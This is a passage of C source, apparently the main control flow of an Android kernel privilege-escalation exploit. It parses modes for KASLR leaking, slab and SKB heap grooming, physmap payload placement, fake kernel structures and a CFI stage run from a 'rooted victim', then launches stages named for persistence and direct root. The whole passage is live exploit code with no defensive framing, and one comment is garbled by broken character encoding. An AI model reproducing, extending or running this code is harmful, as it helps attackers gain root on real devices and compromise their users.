      perf_bisect_left = 1;
      pr_info("bisectl mode: left back to B (self-left suspect)\n");
    } else if (!strcmp(argv[ai], "vcfi")) {
      /* §124.17 Option 1: the FULL seq (which roots a victim) plus the CFI stage
         executed BY that rooted victim - the init domain can open /dev/ashmem
         while the shell domain gets EACCES (§124.16).  Put this token LAST (the
         token parser is position-sensitive: an early flag can suppress the sweep
         bootstrap). */
      g_victim_cfi = 1;
      pr_info("vcfi mode: full seq + victim-side CFI stage (init domain)\n");
    } else if (!strcmp(argv[ai], "slideseq2")) {
      persist_slide_rounds = 2;
      persist_set_slide_rounds(2);
    } else if (!strcmp(argv[ai], "cycleovl")) {
      persist_set_cycle_ovl(1);
    } else if (!strcmp(argv[ai], "cycleprio")) {
      persist_set_cycle_prio(1);
    } else if (!strcmp(argv[ai], "nocycleprio")) {
      /* §124.119 PERF20 bisect: fix consumer nice (adjust runs but prio never
         changes - isolates the nice-delta as the life/death variable). */
      persist_set_cycle_prio(0);
      pr_info("nocycleprio mode: consumer nice fixed\n");
    } else if (!strcmp(argv[ai], "slideseq")) {
      persist_slide_rounds = 1;
      persist_set_slide_rounds(1);
    } else if (!strcmp(argv[ai], "buildfops")) {
      build_mode_override = PAGE_PAYLOAD_FOPS;
    } else if (!strcmp(argv[ai], "nosig")) {
      persist_set_skip_sigalrm(1);
    } else if (!strcmp(argv[ai], "neutral")) {
      neutral_page = 1;
    } else if (!strcmp(argv[ai], "buildslide")) {
      build_mode_override = PAGE_PAYLOAD_SLIDE;
    } else if (!strcmp(argv[ai], "nodrain")) {
      /* §91 bisect: disable the drain phase to see whether the mm leak is the
         drain children or the KS phase. */
      g_drain_slabs = 0;
    } else if (!strcmp(argv[ai], "gymode")) {
      /* §58: force the SKB/buddy grooming page source instead of the DMAP page */
      g_force_groom = 1;
    } else if (!strcmp(argv[ai], "physmap")) {
      /* §102: replicate the payload at 4 KB periodicity and use the direct-map
         alias of a chosen physical address (no pagemap / no slab reclaim). */
      g_physmap = 1;
    } else if (!strncmp(argv[ai], "phys=", 5)) {
      g_pmap_phys_wanted = (uintptr_t)strtoull(argv[ai] + 5, NULL, 16);
    } else if (!strcmp(argv[ai], "sweep")) {      /* §103: physmap + in-boot (delta x candidate) probe grid, then the seq */
      g_physmap = 1;
      persist_set_sweep(1);
      persist_set_seq(1);
      /* bootstrap the page at grid entry 0 so the device path never needs pagemap */
      g_pmap_phys_wanted = persist_sweep_first_phys();
    } else if (!strcmp(argv[ai], "ownprobe")) {   /* §109: delta-free self-write probe (target/value both in the candidate page) */
      g_physmap = 1;
      g_own_probe = 1;
      persist_set_sweep(1);
      g_pmap_phys_wanted = persist_sweep_first_phys();
    } else if (!strcmp(argv[ai], "zerolock")) {   /* §113: no payload page - lock = always-zero padding page */
      g_zero_lock = 1;
      g_physmap = 0;
    } else if (!strcmp(argv[ai], "proptest")) {   /* §119: raw property_service client, differential vs bionic */
      return prop_test_main();
    } else if (!strcmp(argv[ai], "noslide")) {
      skip_slide = 1;
    } else if (!strcmp(argv[ai], "keepdirty")) {
      /* keep the page exactly as the slide round left it (its poison points at
         the slide thread's stack) - models the device, where nothing rebuilds */
      keep_dirty = 1;
    } else if (!strncmp(argv[ai], "sweepstart=", 11)) {
      /* 124.27: force the sweep grid entry (delta-major) so the first
         probe hits a different candidate page (page-shaped step-2 test). */
      persist_set_sweep_start((int)strtol(argv[ai] + 11, NULL, 0));
    } else if (!strncmp(argv[ai], "seqend=", 7)) {
      /* 124.42: forensic stop after seq step N lands (slide isolation). */
      persist_set_seq_end((int)strtol(argv[ai] + 7, NULL, 0));
    } else if (!strcmp(argv[ai], "sweeprev")) {
      /* 124.38: walk the grid backwards (from sweepstart down to sweepend). */
      persist_set_sweep_rev(1);
    } else if (!strncmp(argv[ai], "sweepend=", 9)) {
      /* 124.38: stop cleanly when the next entry would pass N (no wrap). */
      persist_set_sweep_end((int)strtol(argv[ai] + 9, NULL, 0));
    } else if (!strncmp(argv[ai], "sweepskip=", 10)) {
      /* 124.54: permanently skip fixed-noise killer entries (comma list). */
      persist_set_sweep_skip(argv[ai] + 10);
    } else if (mode_stress && stress_count == 0) {
      stress_count = atoi(argv[ai]);
    } else if (mode_persist && persist_rounds == 0) {
      persist_rounds = atoi(argv[ai]);
    }
  }
  /* §124.23b: observation before enforcement - the plan line stays (one line of
     derived state proved its worth: it refuted a hypothesis in a single log
     read), but the guard that asserted "vcfimin requires seq_mode" is DELETED:
     its premise was refuted (FOPS is the load-bearing shape for this route), and
     a guard on a wrong invariant only hard-codes the wrong model. */
  pr_info("plan: seq_mode=%d victim_cfi=%d build_mode=%s persist_rounds=%d\n",
          seq_mode, g_victim_cfi,
          (persist_slide_rounds || seq_mode) ? "SLIDE" : "FOPS", persist_rounds);
  if (mode_stress && stress_count <= 0) {
    stress_count = 30;
  }
  if (mode_persist && persist_rounds <= 0) {
    persist_rounds = 30;
  }
  if (argc > 2 && argv[2] && !strcmp(argv[2], "stress") && stress_count <= 0) {
    stress_count = 30;
  }
  if (argc > 2 && argv[2] && !strcmp(argv[2], "probe")) {
    extern int g_probe_stop;
    g_probe_stop = 1;
  }
  pr_info("phys delta = %#zx no_restore=%d stress=%d\n",
          (size_t)g_phys_delta, g_no_restore, stress_count);
  if (!init_direct_root_cpu()) {
    pr_error("runtime performance CPU detection failed errno=%d\n", errno);
    return 1;
  }
  /* §124.103: perf slide prefill (before sweep/seq).  Deterministic KASLR,
     ~1 min.  On failure the seq falls back to the walk slide round. */
  if (perf_slide_requested) {
    if (perf_leak_slide()) {
      pr_success("perfslide prefill OK - walk slide round will be skipped\n");
    } else {
      pr_warning("perfslide prefill FAILED - falling back to walk slide\n");
      perf_slide_requested = 0;
    }
  }
  log_startup_context();

  pin_to_core(CORE);
  if (!skip_slide && !slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }

  /*
   * slide ??skb 已�?被�?进�?消费，KASLR 也已读�?；在?��?程中?�放?�代
   * reclaim socket 与�???mm pin，避??direct worker ?�关?�继?�副?��?   * ?�父进�?仍�???partial slab 保活??   */
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  if (!keep_dirty) {
    page_base = 0;
    fake_lock = 0;
    fake_w0 = 0;
    fake_task = 0;
  }
  pr_info("slide generation released before direct stage keep_dirty=%d\n",
          keep_dirty);

  if (argc > 2 && argv[2] && !strcmp(argv[2], "probe")) {
    pr_info("probe mode: stopping after slide leak\n");
    return 0;
  }
  if (stress_count > 0) {
    pr_info("stress mode: %d known-plaintext primitives no_restore=%d\n",
            stress_count, g_no_restore);
    return run_stress_stage(stress_count) ? 0 : 2;
  }
  if (persist_rounds > 0) {
    if (seq_mode && !skip_slide) {
      persist_set_seq_start(1);   /* the slide stage already ran */
    }
    int saved = g_no_restore;
    uintptr_t pb = page_base;
    int build_mode = (persist_slide_rounds || seq_mode) ? PAGE_PAYLOAD_SLIDE
                                          : PAGE_PAYLOAD_FOPS;
    if (build_mode_override >= 0) {
      build_mode = build_mode_override;
    }
    if (!keep_dirty || !pb) {
      g_no_restore = 0;
      pb = prepare_good_kernel_page(build_mode);
      if (!pb) {
        pr_error("persist page prepare failed\n");
        return 2;
      }
    }
    set_pselect_write(SLIDE_RANDOM_BOOT_ID_DATA, dmap_alias(), 0);
    if (!keep_dirty && !g_zero_lock &&
        !prepare_skb_payload(pb, PAGE_PAYLOAD_FOPS)) {
      pr_error("persist payload build failed\n");
      return 2;
    }
    if (neutral_page) {
      persist_neutralize_page();
    }
    g_no_restore = saved;
    pr_info("persist mode: %d rounds no_restore=%d keep_dirty=%d "
            "slide_rounds=%d build_mode=%d\n",
            persist_rounds, g_no_restore, keep_dirty, persist_slide_rounds,
            build_mode);
    /* §113.16: the seq's read rounds target __entry_task[direct_root_cpu], which is
       written by the LAST kernel entry on that CPU - so the round-driving thread
       must actually be the one running there.  Every page-prep path above pins to
       CORE (cpu 0), so re-pin here, after all of it. */
    /* §113.18: the seq's read rounds target __entry_task[direct_root_cpu], which is
       written by the LAST kernel entry on that CPU - so the round-driving thread
       must run there.  Every page-prep path above pins to CORE (cpu 0), so re-pin
       here, after all of it.  Never adopt the observed CPU (that would move the
       per_cpu_offset collateral onto a live cpu+1 base, STATUS §70); sched_yield
       forces the migration, sched_getcpu is printed for information only. */
    if (g_zero_lock && direct_root_cpu >= 0) {
      pin_to_core((size_t)direct_root_cpu);
      sched_yield();
      usleep(30000);
      sched_yield();
      pr_info("zerolock pin: main thread cpu=%d (index %d, highest online)\n",
              sched_getcpu(), direct_root_cpu);
    }
    return run_persist_stage(persist_rounds) ? 0 : 2;
  }
  return run_direct_root_stage() ? 0 : 2;
}
